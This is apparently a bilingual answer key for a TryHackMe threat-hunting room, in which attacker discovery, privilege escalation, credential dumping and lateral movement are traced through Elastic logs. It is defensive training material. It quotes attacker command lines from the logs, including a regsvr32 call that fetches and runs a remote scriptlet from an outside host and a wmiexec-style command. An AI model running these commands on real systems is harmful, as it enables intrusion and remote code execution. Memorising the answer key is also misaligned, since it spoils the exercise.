# Threat Hunting: Pivoting
| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|--------|--------|-------------|---------|
| Medium | Walkthrough / Threat Hunting (DFIR) | threathuntingpivoting | https://tryhackme.com/room/threathuntingpivoting | 02 Level Medium | TryHackMe | Elastic Stack (ELK), KQL, MITRE ATT&CK, Discovery, Privilege Escalation, Credential Access (LSASS/DCSync), Lateral Movement (WMIExec/Pass-the-Hash), SharpHound | Caza de actividades sospechosas que indican propagación de la amenaza (pivoting) a través de la infraestructura |

> **Objeto:** Cazar actividades sospechosas que indiquen propagación de la amenaza (pivoting) a través de la infraestructura.

---
**Contexto:** **Threat Hunting: Pivoting** es una sala guiada de dificultad Media centrada en la **propagación del atacante** por la infraestructura. Sobre una instancia de Elastic Stack se investigan, mediante consultas KQL, cuatro tácticas encadenadas: **Discovery** (enumeración de host y escaneo de puertos con SharpHound), **Privilege Escalation** (abuso de `regsvr32` y del servicio Spooler), **Credential Access** (volcado de `lsass.DMP` y DCSync) y **Lateral Movement** (WMIExec y Pass-the-Hash). El objetivo es correlacionar los eventos para reconstruir la propagación del adversario y localizar cuentas, procesos y hashes implicados.
> **ES:** Cazar actividades sospechosas que indiquen propagación de la amenaza a través de la infraestructura.
> **EN:** Hunting suspicious activities indicating threat propagation across the infrastructure.

## Solucionario
### Task 1: Introducción / Introduction
**Explicación:** Presentación de la sala de threat hunting centrada en la propagación (pivoting) del atacante.

| Pregunta / Question | Respuesta / Answer |
|---------------------|--------------------|
| I am ready to start hunting! | `No answer needed` |

### Task 2: Configuración del laboratorio / Lab Setup
**Explicación:** Se despliega y se accede a la instancia de Elastic Stack (ELK) con la que se realizan las investigaciones.

| Pregunta / Question | Respuesta / Answer |
|---------------------|--------------------|
| I have started the Elastic Stack instance! | `No answer needed` |

### Task 3: Táctica: Discovery / Tactic: Discovery
**Explicación:** Se caza el reconocimiento del entorno. Se identifica la cuenta que ejecuta enumeración de host en DC01 (`backupadm`), el proceso padre de `n.exe` durante el escaneo de puertos (`powershell.exe`) y la línea de comandos completa de `SharpHound.exe` usada para recolectar información de Active Directory.

| Pregunta / Question | Respuesta / Answer |
|---------------------|--------------------|
| What is the name of the account seen to be executing host enumeration commands on DC01? | `backupadm` |
| Following the port scanning activity investigation, what is the parent process of n.exe? | `powershell.exe` |
| What is the full command-line value of the SharpHound.exe process? | `"C:\Users\bill.hawkins\Documents\sharp\SharpHound.exe" -c all` |

### Task 4: Táctica: Privilege Escalation / Tactic: Privilege Escalation
**Explicación:** Se caza la escalada de privilegios. Se identifica la línea de comandos del proceso lanzado por `spoofer.exe` (abuso de `regsvr32` con un `.sct` remoto), el otro servicio abusado además de SNMPTRAP (el servicio **Spooler**) y el hash MD5 del binario `update.exe`.

| Pregunta / Question | Respuesta / Answer |
|---------------------|--------------------|
| What is the full command-line value of the process spawned by spoofer.exe? | `regsvr32 /s /n /u /i:http://www.oneedirve.xyz/321c3cf/teams.sct scrobj.dll` |
| What is the name of the other service that was abused besides SNMPTRAP? | `Spooler` |
| What is the MD5 hash of the update.exe binary? | `0be0cd5d0f361be812e4eec615b9b5c4` |

### Task 5: Táctica: Credential Access / Tactic: Credential Access
**Explicación:** Se caza el robo de credenciales. Se localiza el proceso que creó `lsass.DMP` (`Taskmgr.exe`), el GUID de DCSync presente en los logs entre los cuatro GUIDs de referencia y el primer proceso lanzado por `jade.burke` en WKSTN-1 (`wsmprovhost.exe`).

| Pregunta / Question | Respuesta / Answer |
|---------------------|--------------------|
| What is the name of the process that created the lsass.DMP file? | `Taskmgr.exe` |
| Out of the four GUIDs used to hunt DCSync, what is the value of the GUID seen in the existing logs? | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
| What is the name of the first process spawned by jade.burke on WKSTN-1? | `wsmprovhost.exe` |

### Task 6: Táctica: Lateral Movement / Tactic: Lateral Movement
**Explicación:** Se caza el movimiento lateral. Se identifica la cuenta que también usó `WMIExec` en WKSTN-1 además de `clifford.miller` (`jade.burke`), el número de eventos de posible Pass-the-Hash (excluyendo el falso positivo) y la línea de comandos del proceso posterior al primer PtH exitoso de `clifford.miller`.

| Pregunta / Question | Respuesta / Answer |
|---------------------|--------------------|
| What is the name of the account that also used WMIExec on WKSTN-1 aside from clifford.miller? | `jade.burke` |
| Excluding the false positive account, how many events were generated by potential Pass-the-Hash authentications? | `10` |
| Excluding the executions of the cd command, what is the full command-line value of the subsequent process spawned after the first successful PtH authentication of clifford.miller? | `cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1688924047.711874 2>&1` |

### Task 7: Conclusión / Conclusion
**Explicación:** Cierre de la sala y resumen de las técnicas de caza empleadas para detectar la propagación del adversario.

| Pregunta / Question | Respuesta / Answer |
|---------------------|--------------------|
| I enjoyed the hunt! | `No answer needed` |

### Tabla de preguntas y respuestas
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | I am ready to start hunting! | `No answer needed` |
| 2 | I have started the Elastic Stack instance! | `No answer needed` |
| 3.1 | What is the name of the account executing host enumeration on DC01? | `backupadm` |
| 3.2 | Following the port scanning investigation, what is the parent process of n.exe? | `powershell.exe` |
| 3.3 | What is the full command-line value of the SharpHound.exe process? | `"C:\Users\bill.hawkins\Documents\sharp\SharpHound.exe" -c all` |
| 4.1 | What is the full command-line value of the process spawned by spoofer.exe? | `regsvr32 /s /n /u /i:http://www.oneedirve.xyz/321c3cf/teams.sct scrobj.dll` |
| 4.2 | What is the name of the other service abused besides SNMPTRAP? | `Spooler` |
| 4.3 | What is the MD5 hash of the update.exe binary? | `0be0cd5d0f361be812e4eec615b9b5c4` |
| 5.1 | What is the name of the process that created the lsass.DMP file? | `Taskmgr.exe` |
| 5.2 | Out of the four GUIDs used to hunt DCSync, which value is seen in the logs? | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` |
| 5.3 | What is the name of the first process spawned by jade.burke on WKSTN-1? | `wsmprovhost.exe` |
| 6.1 | Which account also used WMIExec on WKSTN-1 aside from clifford.miller? | `jade.burke` |
| 6.2 | Excluding the false positive, how many Pass-the-Hash events were generated? | `10` |
| 6.3 | Full command-line of the process after the first successful PtH of clifford.miller? | `cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1688924047.711874 2>&1` |
| 7 | I enjoyed the hunt! | `No answer needed` |

---
**Metodología:** Introducción → configuración de ELK → caza de Discovery (enumeración + SharpHound) → caza de Privilege Escalation (regsvr32 / Spooler) → caza de Credential Access (lsass.DMP / DCSync) → caza de Lateral Movement (WMIExec / Pass-the-Hash) → conclusión.

### Cadena de ataque / Attack Chain
```
Introducción -> Lab Setup (Elastic Stack)
-> Discovery: backupadm enumera DC01 / n.exe (parent powershell.exe) / SharpHound.exe -c all
-> Privilege Escalation: spoofer.exe -> regsvr32 ... teams.sct ; servicio Spooler ; update.exe MD5 0be0cd5d0f361be812e4eec615b9b5c4
-> Credential Access: Taskmgr.exe -> lsass.DMP ; DCSync GUID 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 ; jade.burke -> wsmprovhost.exe
-> Lateral Movement: WMIExec (clifford.miller + jade.burke) ; 10 eventos PtH ; cmd.exe /Q /c whoami ... -> Conclusión
```
**Learning chain:** Reconocimiento del entorno → escalada de privilegios → robo de credenciales → movimiento lateral → reconstrucción de la propagación.
**Lección:** *La propagación del atacante se detecta correlacionando tácticas: enumeración, escalada, robo de credenciales y movimiento lateral; el abuso de binarios y servicios legítimos dificulta la detección.*
**MITRE ATT&CK:** T1046 (Network Service Discovery), T1068 (Exploitation for Privilege Escalation), T1003.001 (OS Credential Dumping: LSASS Memory), T1550.002 (Use Alternate Authentication Material: Pass the Hash), T1047 (Windows Management Instrumentation).
**Fuente:** [TryHackMe - Threat Hunting: Pivoting](https://tryhackme.com/room/threathuntingpivoting)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
